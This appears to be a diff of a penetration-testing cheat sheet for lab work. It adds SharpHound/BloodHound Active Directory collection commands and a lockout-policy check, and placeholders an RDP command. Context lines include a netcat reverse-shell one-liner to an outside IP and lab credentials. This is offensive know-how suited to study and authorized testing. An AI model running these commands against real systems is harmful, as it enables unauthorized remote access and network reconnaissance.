@@ -111,7 +111,7 @@ bash -c "bash <oneliner>"
 ##### RDP to Win and mounting a shared folder
 ```bash
 # xfreerdp
-xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents
+xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:<share/folder/name>,<dir/on/kali>
 
 # rdesktop
 rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents
@@ -162,6 +162,11 @@ nc -e /bin/sh 10.0.0.1 1234
 
 
 #### PowerShell
+
+##### Find account lockout policy
+```powershell
+net accounts
+```
 
 ##### Run PowerShell in Bypass mode
 ```powershell
@@ -1593,3 +1598,21 @@ Get-NetComputer | select operatingsystem,dnshostname
 
 
 ## PsLoggedOn
+
+
+
+## SharpHound
+
+##### Get Help
+```powershell
+Get-Help Invoke-Bloodhound
+```
+
+##### Collect all info (except for local group policies?)
+```powershell
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\<user>\Desktop\ -OutputPrefix "<file_name>"
+```
+
+
+## BloodHound
+
